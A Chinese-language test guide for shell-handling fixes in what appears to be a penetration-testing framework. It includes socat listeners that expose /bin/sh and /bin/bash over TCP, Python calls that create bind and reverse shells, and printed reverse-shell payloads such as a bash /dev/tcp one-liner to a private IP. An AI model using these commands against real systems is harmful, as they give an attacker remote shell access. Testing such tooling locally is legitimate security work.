# 🧪 Shell 修复测试指南

## 快速测试步骤

### 准备工作

1. **安装依赖**
```bash
pip install -e .
```

2. **启动测试目标**

在**另一个终端**中运行：

```bash
# 终端 1: 简单 shell
socat TCP-LISTEN:45700,reuseaddr,fork EXEC:'/bin/sh -i'

# 终端 2: Bash shell
socat TCP-LISTEN:45701,reuseaddr,fork EXEC:'/bin/bash -li'
```

### 运行测试

```bash
python test_shell_fixes_manual.py
```

---

## 测试内容

### Test 1: 简单 Shell 输出 ✅
**测试**: 命令是否真正执行并返回输出

**修复前**:
```
execute_command("echo SIMPLE_OK; whoami; pwd")
返回: success=True, stdout=""  ❌ 输出为空
```

**修复后**:
```
execute_command("echo SIMPLE_OK; whoami; pwd")
返回: success=True, stdout="SIMPLE_OK\nxp\n/home/xp"  ✅ 有输出
```

**验证点**:
- ✅ 命令回显验证
- ✅ 输出不为空
- ✅ 内容正确

---

### Test 2: Bash Shell 兼容性 ⚠️
**测试**: 复杂 bash 提示符是否能识别

**修复前**:
```
bash -li 提示符: \x1b[01;32m\u@\h\x1b[00m:\x1b[01;34m\w\x1b[00m\$
execute_command() 返回: exit_code=-1  ❌ 超时
```

**修复后**:
```
使用宽松的 prompt 模式: .{0,500}[\$#>]\s*$
execute_command() 返回: success=True  ✅ 成功
```

**验证点**:
- ✅ 不超时
- ✅ 能识别复杂提示符
- ✅ 返回输出

---

### Test 3: Reverse Shell Payload ✅
**测试**: Payload 是否使用真实 IP

**修复前**:
```
create_reverse_shell(local_port=4444)
返回: bash -i >& /dev/tcp/0.0.0.0/4444 0>&1  ❌ 无效 IP
```

**修复后**:
```
create_reverse_shell(local_port=4444)
返回: bash -i >& /dev/tcp/192.168.1.23/4444 0>&1  ✅ 真实 IP
```

**验证点**:
- ✅ 不使用 0.0.0.0
- ✅ 使用真实本地 IP
- ✅ Payload 可用

---

### Test 4: 副作用命令 ✅
**测试**: 命令是否真正执行（不只是假成功）

**修复前**:
```
execute_command("echo TEST > /tmp/test_file")
返回: success=True  ✅
检查文件: 不存在  ❌ 命令没执行
```

**修复后**:
```
execute_command("echo TEST > /tmp/test_file")
返回: success=True  ✅
检查文件: 存在，内容正确  ✅ 命令真正执行
```

**验证点**:
- ✅ 文件被创建
- ✅ 内容正确
- ✅ 不是假成功

---

## 预期结果

```
╔══════════════════════════════════════════════════════════╗
║         Test Summary                                     ║
╚══════════════════════════════════════════════════════════╝

✅ PASS - simple_shell
  Output: SIMPLE_OK\nxp\n/home/xp

✅ PASS - bash_shell
  Output: BASH_OK\nxp\n/home/xp

✅ PASS - reverse_payload
  Valid IP: bash -i >& /dev/tcp/192.168.1.23/45702 0>&1

✅ PASS - side_effect
  File created with correct content

════════════════════════════════════════════════════════════
Results: 4/4 tests passed
════════════════════════════════════════════════════════════
```

---

## 如果测试失败

### Test 1/4 失败 - 输出为空
**可能原因**:
- 命令回显验证超时
- Prompt 模式不匹配

**检查**:
```bash
# 查看日志
tail -f amp.log | grep "Command echo"
```

### Test 2 失败 - Bash 超时
**可能原因**:
- Prompt 模式仍然太严格
- 需要更宽松的匹配

**临时解决**:
```bash
# 使用简单 shell 代替
export PS1='$ '
bash --norc --noprofile
```

### Test 3 失败 - 仍然 0.0.0.0
**可能原因**:
- _get_local_ip() 未被调用
- 代码未生效

**检查**:
```python
from amp.core.shell.manager import ShellManager
manager = ShellManager(db)
print(manager._get_local_ip())  # 应该返回真实 IP
```

---

## 手动验证

如果自动测试有问题，可以手动验证：

### 1. 测试简单 Shell
```python
from amp.storage.database import Database
from amp.core.shell.manager import ShellManager

db = Database('sqlite:///amp.db')
manager = ShellManager(db)

# 创建 shell
shell = manager.create_bind_shell(
    name="test",
    target_host="127.0.0.1",
    target_port=45700
)

# 执行命令
result = manager.execute_command(shell.id, "whoami")
print(f"Output: {result.stdout}")  # 应该有输出
```

### 2. 测试 Reverse Payload
```python
shell, payload = manager.create_reverse_shell(
    name="test-rev",
    local_port=4444,
    target_host="test"
)
print(f"Payload: {payload}")
# 应该看到真实 IP，不是 0.0.0.0
```

---

## 清理

测试完成后：

```bash
# 停止 socat 进程
pkill -f "socat.*45700"
pkill -f "socat.*45701"

# 删除测试数据库
rm amp_test.db
```

---

**准备好测试了吗？** 🚀
